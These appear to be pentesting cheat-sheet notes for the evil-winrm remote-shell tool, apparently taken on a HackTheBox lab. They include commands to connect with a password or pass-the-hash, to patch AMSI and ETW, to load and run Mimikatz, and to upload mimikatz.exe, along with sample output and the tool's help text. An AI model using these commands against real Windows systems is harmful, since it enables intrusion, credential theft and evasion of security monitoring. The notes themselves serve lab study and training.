
### Connecting

default ports: 5895 and 5896 (and 47001)

`evil-winrm -i 192.168.1.10 -u administrator -p password123`

using ssl:
`evil-winrm -i 192.168.1.10 -u administrator -p password123 -S`

Pass the hash:
`evil-winrm -i 192.168.1.10 -u administrator -H 32196B56FFE6F45E294117B91A83BF38`

run powershell example:
```sh
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz
```


https://github.com/Hackplayers/evil-winrm
https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/

to make `menu` have poweshell scripts
`evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'`

### Commands in evil-winrm

##### menu

```powershell
*Evil-WinRM* PS C:\Users\emily\desktop> menu


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```

##### Bypass-4MSI

```powershell
*Evil-WinRM* PS C:\Users\emily\desktop> Bypass-4MSI

Info: Patching 4MSI, please be patient...

[+] Success!

Info: Patching ETW, please be patient ..

[+] Success!
```

##### services

```powershell
*Evil-WinRM* PS C:\Users\emily\desktop> services

Path                                                                                    Privileges Service                      
----                                                                                    ---------- -------                      
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                    False ADWS                         
"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc                   False edgeupdate                   
"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc                False edgeupdatem                  
"C:\Program Files (x86)\Microsoft\Edge\Application\130.0.2849.56\elevation_service.exe"      False MicrosoftEdgeElevationService
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                 True NetTcpPortSharing            
C:\Windows\SysWow64\perfhost.exe                                                             False PerfHost                     
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                   False Sense                        
C:\Windows\servicing\TrustedInstaller.exe                                                    False TrustedInstaller             
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                       False VGAuthService                
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                          False VMTools                      
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\NisSrv.exe"               True WdNisSvc                     
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"              True WinDefend                    
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                         False WMPNetworkSvc  
```

##### upload

```powershell
*Evil-WinRM* PS C:\Users\emily\Documents> upload mimikatz.exe

Info: Uploading /home/fixit42/boxes/htb/administrator/mimikatz.exe to C:\Users\emily\Documents\mimikatz.exe

Data: 1807016 bytes of 1807016 bytes copied

Info: Upload successful!
```

##### download

```powershell

```

### Help

```sh
┌──(kali㉿kali)-[~]
└─$ evil-winrm -h                                             
                                        
Evil-WinRM shell v3.7

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -a, --user-agent USERAGENT       Specify connection user-agent (default Microsoft WinRM Client)
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```
